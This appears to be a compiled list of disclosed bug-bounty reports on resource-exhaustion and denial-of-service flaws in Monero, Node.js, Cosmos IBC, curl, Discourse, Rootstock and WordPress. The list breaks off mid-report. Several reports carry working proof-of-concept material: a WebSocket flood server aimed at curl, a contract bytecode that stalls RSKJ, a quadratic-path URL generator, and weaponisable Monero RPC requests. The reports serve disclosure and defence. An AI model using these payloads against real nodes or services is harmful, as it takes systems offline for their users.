# Uncontrolled Resource Consumption

_116 reports — High/Critical, disclosed_

### [Critical Deadlock Vulnerability in Monero RPC Leading to Complete Node Paralysis](https://hackerone.com/reports/3307874)

- **Report ID:** `3307874`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @rorkh
- **Bounty:** - usd
- **Disclosed:** 2026-05-06T17:13:37.828Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A deadlock vulnerability in Monero's JSON-RPC interface allows a remote, unauthenticated attacker to completely paralyze any Monero node with a single HTTP request containing specific batch methods, leading to permanent denial of service.

## Releases Affected:
- Monero 'Fluorine Fermi' (v0.18.4.2-2987b7200)
- Likely all previous versions
- All operating systems (Linux, Windows, macOS)
- All run modes (mainnet, testnet, offline, restricted-rpc)

Severity:
CVSS 3.0: 10.0 – Critical:
- CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Rationale:
- Remote, network-based attack
- No privileges required
- Immediate node paralysis

Affects availability, integrity, and potentially confidentiality

## Steps To Reproduce:
1. Start Monero node with any configuration:
   ./monerod \                              ─╯
  --testnet \
  --data-dir ~/monero-testnet/blockchain \
  --rpc-bind-port 28081 \
  --p2p-bind-port 28080 \
  --restricted-rpc \
  --confirm-external-bind \
  --add-exclusive-node 127.0.0.1:28080 \
  --log-level 4 \

2. Run the script
python3 exploit/PoC.py http://localhost:28081/json_rpc 50 500

3. Observe:
- Node becomes completely unresponsive (RPC, P2P, admin)
- Standard termination signals (SIGTERM/SIGINT) do not work
- Only kill -9 can terminate the process


Proof of Concept
The PoC demonstrates:
  - Multithreaded adaptive load: 50 threads sending batched JSON-RPC requests.
Mix of request types:
  - Valid Monero RPC methods (get_block_headers_range, get_output_distribution, etc.)
  - Invalid or malformed requests
  - Resource-heavy requests triggering memory allocation
  - Adaptive batch size and memory usage based on server responses (413 / 429 / request too large)
  - Gzip compression for large payloads
  - User-Agent and X-Forwarded-For randomization to bypass basic filtering
  - Effect: 29+ threads blocked, node deadlocked, requires SIGKILL to recov

Supporting materials/links:
- gdb_thread_dump.txt (blocked threads)
- process_status.txt (thread states)
- deadlock_graph.png (visualization of blocked threads)
- Vulnerability demonstration script (PoC.py)

Technical Details:
Deadlock occurs when Monero RPC threads enter circular wait on shared resources during batch request handling.
The PoC script triggers this using any combination of RPC methods, demonstrating that the vulnerability is not limited to a single method.
Node remains unresponsive even with --restricted-rpc or offline mode.
The adaptive script proves the attack is resilient against server-side throttling or batch limits.

Housekeeping:
  I've read the rules.
  XMR address for receiving the reward: 44eM3rY8uNrc2tEZn8VrmnN45mEjpVVTBZEHpn5iefjvK23HsaXCCZYcJye4aXoh5Xfrj1q6TkWpKYLXs4yZY6nuPwpVp1T

## Impact

- Availability: Complete and permanent node DoS
- Integrity: Potential blockchain corruption during forced restart
- Confidentiality: Possible leakage of sensitive data during unsafe shutdown
- Ease of attack: Trivial, requires 1 network request, no privileges

---

### [Denial of Service via `__proto__` header name in `req.headersDistinct` (Uncaught `TypeError` crashes Node.js process)](https://hackerone.com/reports/3560402)

- **Report ID:** `3560402`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @yushengchen
- **Bounty:** - usd
- **Disclosed:** 2026-03-30T16:42:13.267Z
- **CVE(s):** CVE-2026-21710

**Summary (team):**

A flaw in Node.js HTTP request handling causes an uncaught `TypeError` when a request is received with a header named `__proto__` and the application accesses `req.headersDistinct`.

When this occurs, `dest["__proto__"]` resolves to `Object.prototype` rather than `undefined`, causing `.push()` to be called on a non-array. This exception is thrown synchronously inside a property getter and cannot be intercepted by `error` event listeners, meaning it cannot be handled without wrapping every `req.headersDistinct` access in a `try/catch`.

* This vulnerability affects all Node.js HTTP servers on **20.x, 22.x, 24.x, and v25.x**

---

### [Economic DoS (Griefing) on IBC Relayers via `memo` Callback Gas Exploitation](https://hackerone.com/reports/3425308)

- **Report ID:** `3425308`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Cosmos
- **Reporter:** @tychebe
- **Bounty:** - usd
- **Disclosed:** 2025-12-18T20:50:41.257Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary of Impact**

This vulnerability allows an attacker to bypass the relayer's simulation defense and force permissionless relayers to execute computationally expensive, but 'successful', transactions via the `memo` callback feature.
    
This creates an asymmetric economic attack where the relayer's cost (e.g., ~1,000,000 gas) vastly exceeds their profit leading to financial losses.
    
Relayers will be forced to stop servicing the affected IBC channel to avoid bankruptcy, causing a Denial of Service (DoS) for all applications relying on that channel's callbacks.
    

**Steps to Reproduce**

1.   **Identify the Callback Gas Limit:** An attacker first inspects the chain's application setup file (e.g., `app/app.go`) to find the hardcoded gas limit for the IBC Callbacks middleware.
        
2.   I have confirmed this value is set to **1,000,000 gas** in the main application configuration.
        
3.   **Deploy a Malicious 'Gas Burner' Contract:** The attacker deploys an EVM smart contract that performs computationally expensive operations (e.g., loops, hashing) designed to consume just under the limit (e.g., **990,000 gas**) and then **return 'success'**.
        
4.   This contract must _not_ fail with 'Out of Gas' (OOG).
        
5.   **Send an IBC Packet with Malicious Memo:** The attacker sends a standard IBC packet (e.g., `MsgTransfer`) and includes a `memo` field specifying the address of the 'Gas Burner' contract as the source callback.
        
6.   **Relayer Simulation is Bypassed:** A relayer bot picks up the acknowledgment (`MsgAcknowledgement`) for this packet and runs a simulation.
        
7.   Because the callback consumes 990,000 gas (which is less than the 1,000,000 limit) and returns 'success', the simulation _passes_, falsely identifying the transaction as safe.
        
8.   **Relayer Incurs Financial Loss:** The relayer broadcasts the 'successful' transaction. The chain executes it, including the 990,000 gas callback.
        
9.   The relayer must pay the full gas cost (~1,000,000 gas) but only receives their standard fee (which is 0 if ICS-29 is not used, or ~300,000 gas if it is).
        
10.   **Result (Griefing):** The attacker can repeat this process, draining the relayer's funds at minimal cost, forcing the relayer to abandon the channel.
        

**Mitigation**

-    **1. Reduce the Gas Limit:** The simplest mitigation is to drastically reduce the hardcoded `DefaultGasLimitForCallback` in `app/app.go` from 1,000,000 to a value much closer to a standard relayer's profit margin.
    
-    **2. Implement Dynamic Gas (Better):** A more robust solution is to require the _sender_ of the original packet to explicitly define (and pay for) the maximum gas their callback will use, similar to ICS-29 fees.
    
-    **3. Smarter Simulation:** Relayer clients could be updated to not only check for 'success' but also to _report the total gas consumed_ by the simulation. Relayers could then set a local policy to reject 'successful' transactions that consume an unprofitable amount of gas.

**Reference**

-    **ICS-29 Fee Middleware:** Understanding how relayers are _supposed_ to be paid (and why their profit is often 0 or very low) is key to this economic exploit.
    
-    **Blockchain Griefing Attacks:** This is a classic example of a griefing attack, where the attacker's goal is not direct profit, but to cause financial harm to another party to disrupt the network. [Source: scsfg.io - Smart Contract Security Field Guide]

## Impact

-    **Immediate Relayer Bankruptcy:** Any permissionless relayer servicing this chain's callback-enabled channels will be rapidly drained of funds and forced to shut down.
    
-    **Total Channel DoS:** When relayers stop servicing the channel, all cross-chain applications that depend on IBC callbacks (e.g., cross-chain DeFi, NFT transfers) will cease to function, effectively freezing assets and operations.
    
-    **Loss of Trust:** This attack breaks the fundamental economic incentive for the decentralized relayer network, demonstrating that the chain is economically unsafe to service and undermining trust in the entire IBC ecosystem connected to this chain.

---

### [Denial of Service (DoS) vulnerability in dedotdotify() URL path normalization](https://hackerone.com/reports/3463608)

- **Report ID:** `3463608`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** curl
- **Reporter:** @sy2n0
- **Bounty:** - usd
- **Disclosed:** 2025-12-13T16:21:37.027Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

A Denial of Service (DoS) vulnerability exists in the `dedotdotify()` function in `lib/urlapi.c` that can cause excessive CPU consumption due to O(n²) time complexity when processing URLs with malicious path patterns containing many `../` sequences.

## Affected Component

- **Component**: libcurl URL API
- **File**: `lib/urlapi.c`
- **Function**: `dedotdotify()` (lines 794-898)
- **Vulnerable Code**: Lines 857-866

## Vulnerability Details

The `dedotdotify()` function normalizes URL paths by removing `../` and `./` sequences according to RFC 3986 Section 5.2.4. However, the implementation has a quadratic time complexity (O(n²)) vulnerability.

### Root Cause

When processing a `/../` sequence, the code uses `memrchr()` to find the last `/` in the output buffer to remove the preceding segment:

```c
else if(is_dot(&p, &blen) && (ISSLASH(*p) || !blen)) {
  /* remove the last segment from the output buffer */
  size_t len = curlx_dyn_len(&out);
  if(len) {
    char *ptr = curlx_dyn_ptr(&out);
    char *last = memrchr(ptr, '/', len);  // O(n) operation
    if(last)
      curlx_dyn_setlen(&out, last - ptr);
  }
```

Each `memrchr()` call scans the entire current output buffer length, which is O(n). When processing a path like `/a1/a2/.../an/../..`, the function:
1. First adds all n segments to the output buffer (buffer size grows to ~n segments)
2. For each `/../`, calls `memrchr()` which scans the entire remaining buffer
3. Total operations: O(n + (n-1) + (n-2) + ... + 1) = O(n²)

### Attack Vector

This vulnerability is triggered in all normal URL parsing operations:

1. **Command-line curl**: When processing user-provided URLs
   - Code path: `src/tool_operate.c` → `parseurlandfillconn()` → `curl_url_set()`

2. **libcurl API**: When `CURLOPT_URL` is set
   - Code path: `lib/url.c:1771` → `curl_url_set()` → `parseurl()` → `dedotdotify()`

3. **Default behavior**: Triggered when `CURLU_PATH_AS_IS` flag is not set (default)
   - Check: `lib/urlapi.c:1230-1233`

### Input Size Limit

- Maximum input length: `CURL_MAX_INPUT_LENGTH` = 8MB (8,000,000 bytes)
- An attacker can create paths up to this limit to maximize CPU consumption

## Impact

### Severity Assessment

**CVSS v3.1 Vector**: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

- **Attack Vector**: Network (malicious URL can be provided via HTTP request, redirect, etc.)
- **Attack Complexity**: Low (simple URL manipulation)
- **Privileges Required**: None
- **User Interaction**: None
- **Scope**: Unchanged
- **Confidentiality**: None
- **Integrity**: None
- **Availability**: High (CPU exhaustion leading to DoS)

### Affected Scenarios

1. **Web servers/proxies** that process user-provided URLs using curl/libcurl
2. **API clients** that accept external URLs
3. **Mobile applications** processing URLs from user input or network responses
4. **Any application** using curl/libcurl to parse URLs from untrusted sources

### Potential Consequences

- **CPU exhaustion**: High CPU usage for extended periods
- **Service degradation**: Delayed response to legitimate requests
- **Resource starvation**: May prevent other requests from being processed
- **Amplification**: A single malicious URL can consume significant CPU resources

## Proof of Concept

### Malicious URL Pattern

```
http://example.com/a1/a2/a3/.../an/../../
```

This pattern first adds n path segments, then processes n `../` sequences, causing maximum CPU consumption.

### PoC Code

A complete proof-of-concept is provided in `dos_PoC.c`:

```c
// Compile: gcc -o dos_PoC dos_PoC.c -lcurl
// Run: ./dos_PoC
```

### Performance Measurements

Testing results on macOS with optimized build:

| Segments | Path Length | Processing Time | Time Ratio |
|----------|-------------|-----------------|------------|
| 100      | 690 bytes   | 0.000012s       | 1.0x       |
| 1,000    | 7,890 bytes | 0.000028s       | 2.3x       |
| 10,000   | 88,890 bytes| 0.000271s       | 22.6x      |
| 50,000   | 488,890 bytes| 0.001383s      | 115.3x     |

**Analysis**:
- When input size increases 10x (1,000 → 10,000 segments), processing time increases ~9.7x
- This demonstrates quadratic time complexity (approaching O(n²))
- With maximum allowed input (8MB), the impact would be significantly greater

### Steps to Reproduce

1. Compile the PoC:
   ```bash
   gcc -O2 -o dos_PoC dos_PoC.c -lcurl
   ```

2. Run the PoC:
   ```bash
   ./dos_PoC
   ```

3. Observe the processing time increases quadratically with input size.

4. Test with actual curl command:
   ```bash
   # Create malicious URL
   MALICIOUS_URL="http://example.com$(python3 -c "print('/a' + '/a'.join(map(str, range(10000))) + '/../' * 10000)")"
   
   # Measure time
   time curl "$MALICIOUS_URL"
   ```

## Affected Versions

This vulnerability affects **all versions of curl/libcurl** that include the `dedotdotify()` function. The function was introduced as part of the URL API implementation.

The vulnerability exists in the current codebase at:
- File: `lib/urlapi.c`
- Function: `dedotdotify()` (line 794)

## Recommended Mitigation

### Short-term Workaround

Applications can use the `CURLU_PATH_AS_IS` flag to skip path normalization:
- For `curl_url_set()`: Pass `CURLU_PATH_AS_IS` in flags
- For `CURLOPT_URL`: Use `CURLOPT_PATH_AS_IS` option

**Note**: This workaround may have security implications if path normalization is required for security purposes.

### Long-term Fix

The `dedotdotify()` function should be rewritten to achieve O(n) time complexity:

1. **Track last slash position**: Instead of using `memrchr()` to search for the last `/` each time, maintain a pointer or index to the last segment boundary.

2. **Single-pass algorithm**: Process the path in a single pass, maintaining a stack or pointer array of segment boundaries.

3. **Example approach**:
   - Use a linked list or array to track segment boundaries
   - When encountering `../`, pop from the segment stack instead of searching
   - This reduces complexity from O(n²) to O(n)

### Input Validation

Consider adding path length limits specifically for `dedotdotify()` processing, independent of the overall `CURL_MAX_INPUT_LENGTH` limit.

## Additional Information

### Related Code References

- Vulnerability location: `lib/urlapi.c:857-866`
- Function definition: `lib/urlapi.c:794-898`
- Call site: `lib/urlapi.c:1230-1233`
- URL parsing entry point: `lib/urlapi.c:901 (parseurl())`

### Testing Environment

- OS: macOS (darwin 25.1.0)
- Compiler: gcc with -O2 optimization
- curl: Latest source code from repository

### Disclosure

This vulnerability was discovered through source code analysis and verified with proof-of-concept code. No actual exploitation attempts were made against production systems.

## References

- RFC 3986 Section 5.2.4: "Remove Dot Segments"
- curl Security Policy: https://curl.se/docs/security.html
- curl Vulnerability Disclosure Policy: https://curl.se/dev/vuln.html

---

## Reporter
- Jiyong Yang / BAEKSEOK University

## Impact

An attacker can cause denial of service and excessive CPU consumption by providing a malicious URL with a path containing many `../` sequences. The dedotdotify() function processes such paths with O(n²) time complexity, consuming disproportionate CPU resources and potentially rendering the service unresponsive or significantly degraded. This affects any application using curl/libcurl to parse untrusted URLs, including web servers, proxies, API clients, and mobile applications.

---

### [Application Level DoS - Large Markdown Payload in Reply Section Leading to Resource Exhaustion](https://hackerone.com/reports/3058919)

- **Report ID:** `3058919`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Discourse
- **Reporter:** @theteatoast
- **Bounty:** - usd
- **Disclosed:** 2025-10-18T16:47:02.928Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

An application level Denial of Service (DoS) vulnerability was identified in the reply section on https://try.discourse.org

By submitting an excessively large markup payload (~800,000 characters), the server takes 30 seconds to respond before returning an HTTP/2 502 Bad Gateway error. This indicates potential resource exhaustion or backend service failure, which could be exploited to degrade or disrupt website availability.

## Attack Scenario:

If an attacker automates this request using multiple parallel requests (e.g., via Burp Intruder, Python scripts, or a botnet), it can cause severe resource exhaustion.

The backend service will be overwhelmed, leading to widespread downtime, preventing legitimate users from accessing the forum.

## Steps To Reproduce:
1. Login with valid credentials on `https://try.discourse.org`

2. Navigate to the default discobot grettings message.
{F4182648}

3. Reply the message with the following paylod while intercepting the request: `https://github.com/theteatoast/theteatoast.github.io/blob/main/payload.txt`
{F4182646}

4. Repeat the request and observe that the server takes ~30 seconds before responding with 502.
{F4182647}

##Video POC:
{F4182629}

##Suggested Mitigation:

1. Implement input length restrictions on replies to prevent excessive payload sizes.

2. Introduce rate-limiting and request throttling to mitigate automated abuse.

3. Optimize backend request handling to reject large payloads early before processing.

##Note:

This Proof of Concept (PoC) was performed solely for demonstration purposes, with no intent to harm the system. I ensured minimal impact while testing.

## Impact

1. Attackers can exploit this to cause severe delays and temporary or prolonged service disruption.

2. The lack of input validation allows attackers to send multiple large requests in parallel, leading to backend resource exhaustion.

3. If automated, this attack could render the forum completely inaccessible.

---

### [WebSocket Fragmentation DoS on Curl Client](https://hackerone.com/reports/3303765)

- **Report ID:** `3303765`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** curl
- **Reporter:** @pelioro
- **Bounty:** - usd
- **Disclosed:** 2025-08-19T14:56:43.482Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
A malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion. This can result in high memory usage and potential crash (OOM), representing a Denial-of-Service vulnerability.

---

### Description
The vulnerability occurs because curl does not limit the number of continuation frames for an unfinished WebSocket message. An attacker controlling a WebSocket server can send:

1. Initial text frame with `FIN=0` (indicating message continuation).  
2. An unbounded number of continuation frames (`opcode=0`, `FIN=0`).  

This causes curl to continuously buffer incoming data until memory is exhausted. The script `ws_frag_poc.py` demonstrates the behavior.

---

### Steps to Reproduce
1. Save the following PoC script as `ws_frag_poc.py`:

```python
#!/usr/bin/env python3
# ws_frag_poc.py - DoS PoC for WebSocket fragmentation
import socket, base64, hashlib, threading

HOST, PORT = "0.0.0.0", 8765

def make_handshake_response(key):
    GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    accept = base64.b64encode(hashlib.sha1(key + GUID).digest()).decode()
    return (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
    ).encode()

def make_frame(fin, opcode, payload):
    first = (0x80 if fin else 0x00) | (opcode & 0x0f)
    plen = len(payload)
    header = bytes([first])
    if plen <= 125: header += bytes([plen])
    elif plen < 65536: header += bytes([126]) + plen.to_bytes(2, 'big')
    else: header += bytes([127]) + plen.to_bytes(8, 'big')
    return header + payload

def handle_client(conn, addr):
    data = conn.recv(4096)
    key = next((l.split(b":",1)[1].strip() for l in data.split(b"\r\n") if l.lower().startswith(b"sec-websocket-key:")), None)
    if not key: return conn.close()
    conn.sendall(make_handshake_response(key))
    conn.sendall(make_frame(fin=False, opcode=1, payload=b"X"*4))
    frag_payload = b"A"*32
    while True:
        conn.sendall(make_frame(fin=False, opcode=0, payload=frag_payload))

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
```

2. Run the PoC:  
```bash
python3 ws_frag_poc.py
```

3. In another terminal, connect using curl:  
```bash
curl --include --no-buffer --output /dev/null ws://127.0.0.1:8765
```

4. Monitor memory usage:  
```bash
ps -o pid,rss,cmd -p <curl_pid>
top -p <curl_pid>
ps aux | grep curl
```

---

### Expected Result
Curl should handle fragmented messages without unbounded memory growth.

### Actual Result
Memory usage grows continuously, CPU spikes, process may hang or crash (OOM).

---

### Mitigation / Recommendation
- Implement limits on the number of continuation frames for unfinished WebSocket messages.  
- Consider maximum message size or memory allocation threshold to prevent client-side DoS.  
- Add proper validation of FIN/fragmented frames in the WebSocket implementation.

---

### References
- [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- CWE-400: Uncontrolled Resource Consumption

## Impact

- High memory consumption on the client.  
- Potential crash or process termination (OOM) in curl.  
- Can be triggered remotely if the client connects to a malicious WebSocket server.

---

### [Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile.](https://hackerone.com/reports/2412583)

- **Report ID:** `2412583`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Rootstock Labs
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2025-06-13T17:02:36.785Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A bug in the modexp precompile can cause long stalls.

## Steps To Reproduce:
Tested on Linux x64.

```sh
#!/bin/bash

wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
./configure.sh
echo """
package co.rsk.vm;

import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import org.ethereum.vm.*;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;
import java.util.HashSet;
import org.ethereum.vm.program.Program;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import javax.xml.bind.DatatypeConverter;
import org.junit.jupiter.api.Test;

public class Poc {
    @Test
    void testPoc() {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);

        byte[] code = DatatypeConverter.parseHexBinary(\"3332335b59313660d53d601c30303030333333333d601c30303030333333333333321b1b1b1b325b593136605858425a606052015952601d52609880808060006000600536f1603d3333321b1b1b1b32365b3159605858425a606052015952601d52609880808060006000600536f1603d313880813b60003960006000f50a30303030303030\");

        invoke.setGas(1000 * 1000 * 5);
        VM vm = new VM(vmConfig, precompiledContracts);
        Program program = new Program(vmConfig, precompiledContracts, blockFactory, activations, code, invoke,null, new HashSet<>(), new BlockTxSignatureCache(new ReceivedTxSignatureCache()));

        for (int k = 0; k < 250; k++) {
            vm.step(program);
        }
    }
}
""">rskj-core/src/test/java/co/rsk/vm/Poc.java

# This will likely fail due to a java.lang.OutOfMemoryError exception
time ./gradlew test  --tests co.rsk.vm.Poc.testPoc

# Increase test heap size
sed -i 's/Xmx3G/Xmx10G/g' rskj-core/build.gradle

# Run again
time ./gradlew test  --tests co.rsk.vm.Poc.testPoc
```

Output:

```
real    8m23.429s
user    0m3.147s
sys	0m0.265s
```

## Impact

Stall the network.

---

### [DOS of RSKJ server](https://hackerone.com/reports/2105808)

- **Report ID:** `2105808`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Rootstock Labs
- **Reporter:** @spacewasp
- **Bounty:** 5000 usd
- **Disclosed:** 2025-06-13T14:23:25.409Z
- **CVE(s):** -

**Vulnerability Information:**

Due of closing of report (ID #2102315) I will summarize total reproducible report here

## Summary:
DOS of RSKJ server

## Steps To Reproduce:

  1. download https://github.com/rsksmart/rskj/releases/download/FINGERROOT-5.0.0/rskj-core-5.0.0-FINGERROOT-all.jar
  2. at server side run
```
 java -classpath rskj-core-5.0.0-FINGERROOT-all.jar -Drpc.providers.web.cors=* -Drpc.providers.web.ws.enabled=true co.rsk.Start
```
it opens `UDPv6` port `5050`

  3. at client side install python3 and library `pip install pysha3`, download  {F2591198},  modify `HOST` inside and run it against server.
  4.the `UDPServer` is going to process *only* one UDP packet forever and it prevents to process other packages received from different nodes. In a while (some minutes left) the application crashes.

## Supporting Material/References:
The root cause:
bytesToLength returns -5 and length becomes 0
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/util/RLP.java#L432
this is legal
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/util/RLP.java#L440
and position is unchangeable
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/util/RLP.java#L405
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/util/RLP.java#L403

## Impact

Server stops to process the incoming traffic at `UDPv6` port `5050`. In a while the application crashes as Out of memory.
due of everywhere usage of vulnerable function `decode2` there may be affected another entry points of service.

---

### [[CVE-2025-27220] ReDoS in CGI::Util#escapeElement](https://hackerone.com/reports/3023605)

- **Report ID:** `3023605`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @svalkanov
- **Bounty:** - usd
- **Disclosed:** 2025-04-30T20:25:13.351Z
- **CVE(s):** CVE-2025-27220

**Vulnerability Information:**

I've made a report at https://hackerone.com/reports/2890322

> There is a possibility for Regular expression Denial of Service(ReDoS) by in the cgi gem

## Impact

The regular expression used in CGI::Util#escapeElement is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.

**Summary (team):**

There is a possibility for Regular expression Denial of Service(ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.

https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/

---

### [Remote memory exhaustion in Epee RPC stack under zero Receive Window](https://hackerone.com/reports/2912194)

- **Report ID:** `2912194`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @sagewilder2022
- **Bounty:** - usd
- **Disclosed:** 2025-04-23T13:53:57.953Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Memory exhaustion can be triggered in `http_protocol_handler.inl` and `abstract_tcp_server2.inl` under delayed ACK or zero Receive Window advertisement. This can lead with specific RPC methods to remote crash of nodes through restricted RPC endpoints.

## Releases Affected

Every branches of monero(d).

## Details

If a socket delays ACK packets and let TCP receive window diminish (for example, by not reading the response from the server), responses are kept in epee server send queue up until a memory exhaustion happen. The RPC method used heavily influence the rapidity of the memory exhaustion.

monerod had the following arguments: `--prune-blockchain --sync-pruned-block --rpc-restricted-bind-port=18089`
Tests have been conducted using the undocumented `get_txids_loose`, `get_info` and `get_output_distribution` methods, generating 208kB, 1.5kB and 17MB response respectively:
```json
{"jsonrpc":"2.0","id":"0","method":"get_output_distribution","params":{"amounts":[0],"from_height":0,"to_height":3300000,"compress":false}}
{"jsonrpc":"2.0","id":"0","method":"get_txids_loose","params":{"txid_template":"0000000000000000000000000000000000000000000000000000000000000000","num_matching_bits":14}}
```
Any JSON-RPC request can be weaponized.

Valgrind of an OOM crash indicated that the memory being leaked originates from a string append at [`/contrib/epee/include/net/http_protocol_handler.inl#L607`](https://github.com/monero-project/monero/blob/893916ad091a92e765ce3241b94e706ad012b62a/contrib/epee/include/net/http_protocol_handler.inl#L607C4-L607C5)
```cpp
  LOG_PRINT_L3("HTTP_RESPONSE_HEAD: << \r\n" << response_data);

	if ((response.m_body.size() && (query_info.m_http_method != http::http_method_head)) || (query_info.m_http_method == http::http_method_options))
		response_data += response.m_body; // <------- here

	m_psnd_hndlr->do_send(byte_slice{std::move(response_data)});
```
This complete string response is then converted into an `epee::byte_slice` and passed to [`/contrib/epee/include/net/abstract_tcp_server2.inl#L756`](https://github.com/monero-project/monero/blob/893916ad091a92e765ce3241b94e706ad012b62a/contrib/epee/include/net/abstract_tcp_server2.inl#L756):
```cpp
template<typename T>
bool connection<T>::send(epee::byte_slice message)
{
  std::lock_guard<std::mutex> guard(m_state.lock);
  if (m_state.status != status_t::RUNNING || m_state.socket.wait_handshake)
    return false;

  // Send queue logic...
```

Here the send queue logic is to accept up to `ABSTRACT_SERVER_SEND_QUE_MAX_COUNT` (1000) responses, if this limit is exceeded then the server starts a random delay between 5 and 6 seconds. If this delay is over, the connection is terminated. All the responses are stored here before being sent, regardless of their size. If we take `get_output_distribution`, one can store up to 17GB in the queue, and more during a period of at least 5 seconds.

The testing virtual machine is equipped with 16 threads, 12GB of RAM and Ubuntu 24.04 LTS.
The PoC has been tested using 1, 4 and 16 sockets with 200 milliseconds delay between requests.
The limit imposed by vtnerd's TCP improvement branch is 31.
A 16 socket execution can kill the node (or machine) in under 30 seconds.
Affected and tested branches are [`master`](https://github.com/monero-project/monero/tree/master) and [`vtnerd:improvement/tcp_throttling`](https://github.com/vtnerd/monero/tree/improvement/tcp_throttling)

### Suspicion of memory leaks

In rare cases (4 times), after the PoC stopped, monerod was let with part of its memory allocated for responses not freed. Effectively leaking memory.
Examining this code I have not been able to assert the exact location of it and the unreliability do not help at profiling the issue.
I do not believe to have introduced something that caused these irregularities. I invite reviewers to be careful upon testing and reviewing the current stack.

### Note

This vulnerability has been assessed after discovering a first bug when fuzzing the RPC stack. The p2p throttle code was entangled with the rpc bandwith leading to complete p2p disconnection under RPC throttling. A search on github permitted to find an open PR fixing this bug and aditional mitigations:
https://github.com/monero-project/monero/pull/9459.

Decision has been taken to test both branches.

### Bounty

XMR address: 8BbCtXoBTuxNYnngbLvfpMQRp2qJEQVtH715eUnM34VvFvUYkdJbSwTCLsBjyr4SjYUskFjNCvoGaA6tiJeKf5jW1PvxPSo

## Impact

Remote crash of any node exposing their RPC interface.

---

### [Unauthenticated WordPress Database Repair DoS](https://hackerone.com/reports/2786591)

- **Report ID:** `2786591`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** WordPress
- **Reporter:** @wshadow
- **Bounty:** - usd
- **Disclosed:** 2024-10-18T13:01:54.056Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

The WordPress Database Repair feature, accessible via the `/wp-admin/maint/repair.php` endpoint, is vulnerable due to improper access control and insecure design. When `WP_ALLOW_REPAIR` is set to `true` in the `wp-config.php` file, the repair page becomes publicly accessible without requiring any authentication. This vulnerability arises from two main issues: the absence of authentication for accessing the repair endpoint and the insecure nature of the WordPress repair feature, which lacks any limits or restrictions on access frequency or user verification. Consequently, an attacker can repeatedly trigger resource-intensive database repair operations, overwhelming server resources and resulting in a Denial of Service (DoS) condition. 
This vulnerability can be categorized under these two CWE's as it fails to impose necessary restrictions on who can access this critical functionality.

**CWE-306: Missing Authentication for Critical Function** 
 **CWE-400: Uncontrolled Resource Consumption**

## Platform(s) Affected:

Wordpress Core  <6.6
https://core.svn.wordpress.org/branches/6.6/

## Steps To Reproduce:

1. Ensure that `WP_ALLOW_REPAIR` is set to `true` in the `wp-config.php` file of the target WordPress installation.
   ```php
   define('WP_ALLOW_REPAIR', true);
   ```
2. Access the database repair endpoint directly by visiting the URL: `http://target-site.com/wp-admin/maint/repair.php`.
